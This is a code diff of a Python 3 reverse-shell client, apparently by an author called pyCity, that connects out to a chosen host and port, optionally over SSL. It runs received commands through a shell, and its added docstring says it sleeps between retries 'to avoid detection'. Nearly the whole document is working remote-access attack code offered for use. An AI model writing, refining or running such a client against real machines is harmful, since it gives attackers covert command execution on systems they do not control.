@@ -1,3 +1,14 @@
+"""
+Author       - pyCity
+Date         - 1/22/2019
+Version      - 1.5
+
+Usage:       - python client.py --ssl 127.0.0.1 4444
+
+Description: - Reverse shell in python 3. Has SSL functionality and periods of sleep to avoid detection.
+             - Ncat --ssl is a valid alternative to using the server.py provided
+"""
+
 import socket
 import subprocess
 import os
@@ -6,15 +17,6 @@ import argparse
 import ssl
 import sys
 
-# Client is not reading "exit" command properly
-
-"""
-Reverse shell in python 3. Has SSL functionality and periods of sleep to avoid detection.
-USAGE: python client.py --ssl 127.0.0.1 4444
-"""
-
-#TODO Add "get" and "put" functionality
-#TODO add https mode
 
 def parse_args():
     """Define host and port variables with optional ssl"""
@@ -31,7 +33,7 @@ def parse_args():
 
 
 
-def connect_socket(host, port, enc=False):
+def connect(host, port, enc=False):
     """Create socket object, connect socket to server"""
 
     # Wait 10 secs if connection isn't successful immediately
@@ -45,20 +47,20 @@ def connect_socket(host, port, enc=False):
         except:
             time.sleep(10)
 
+            
 
-
-def serve_payload(s):
+def serve_shell(s):
     """Recieve commands from remote server and run on local machine"""
 
     # Standard reverse shell
     while True:
-        data = s.recv(1024)
-        if data[:2].decode("utf-8") == 'cd':
-            os.chdir(data[3:].decode("utf-8").strip())
-        elif data[:4].decode("utf-8") == 'exit':
+        data = s.recv(1024).decode("utf-8")
+        if data[:2] == 'cd':
+            os.chdir(data[3:].strip())
+        elif data[:4].strip() == 'kill':
             break
-        if len(data) > 0:
-            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
+        elif len(data) > 0:
+            cmd = subprocess.Popen(data[:], shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
 
@@ -70,11 +72,11 @@ def serve_payload(s):
 
 
 
-
 def main():
-    host, port, enc = parse_args()
-    serve_payload(connect_socket(host, port, enc))
 
+    host, port, enc = parse_args()
+
+    serve_shell(connect(host, port, enc))
 
 
 if __name__ == "__main__":
